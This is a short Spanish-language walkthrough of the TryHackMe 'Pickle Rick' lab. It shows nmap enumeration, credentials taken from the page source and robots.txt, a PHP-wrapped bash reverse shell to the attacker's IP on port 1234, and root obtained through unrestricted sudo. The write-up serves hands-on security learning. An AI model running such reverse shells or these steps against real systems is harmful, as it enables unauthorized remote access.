# Pickle Rick - TryHackMe

## Enumeración
```bash
nmap --script http-enum <ip>
# 80/tcp http, 22/tcp ssh
```
En el código fuente HTML hay una nota:
```
Username: R1ckRul3s
```
Y en `robots.txt`:
```
Wubbalubbadubdub
```

## Foothold - panel de comandos
Login en `/login.php` con `R1ckRul3s:Wubbalubbadubdub`. El portal ejecuta comandos del sistema. Buscamos el primer ingrediente y lanzamos reverse shell:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<mi_ip>/1234 0>&1'"); ?>
```
Shell como `www-data`.

## Escalada - sudo sin restricción
```bash
sudo -l
# (ALL) NOPASSWD: ALL
sudo bash
```
Root. Los 3 ingredientes: código fuente, `Sup3rS3cretPickl3Ingred.txt` y el directorio de root.
